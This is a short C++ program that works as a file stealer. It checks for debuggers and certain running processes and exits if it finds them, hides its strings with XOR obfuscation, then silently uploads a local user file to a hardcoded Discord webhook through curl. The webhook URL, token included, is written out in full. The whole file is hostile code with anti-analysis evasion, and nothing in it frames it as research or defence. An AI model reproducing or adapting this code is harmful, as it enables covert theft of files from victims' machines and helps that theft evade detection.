#include <iostream>
#include <string>
#include <cstdlib>

#include "antidbg.h"
#include "processlist.h"
#include "xorstr.hpp"

int main() {
    if (Antidbg::IsDebuggerPresentCheck() || Antidbg::CloseHandleCheck()) {
        ExitProcess(1);
    }
    if (ProcessList::CheckRunningProcesses()) {
        ExitProcess(1);
    }
    std::string webhookUrl = _XorStr("https://discord.com/api/webhooks/1184444963598106634/dN4oTo_oR-m7zONPsNwOfmgpsGqoyWmYnKa44zMj4xpWpoqoyOaTREvVUueUxoc5F-TA");
    std::string filePath = _XorStr("C:\\VProject\\user.txt");

    std::string curlCommand = "curl -X POST -H \"Content-Type: multipart/form-data\" -F \"file=@" + filePath + "\" " + webhookUrl + " > NUL";

    int result = system(curlCommand.c_str());

    return 0;
}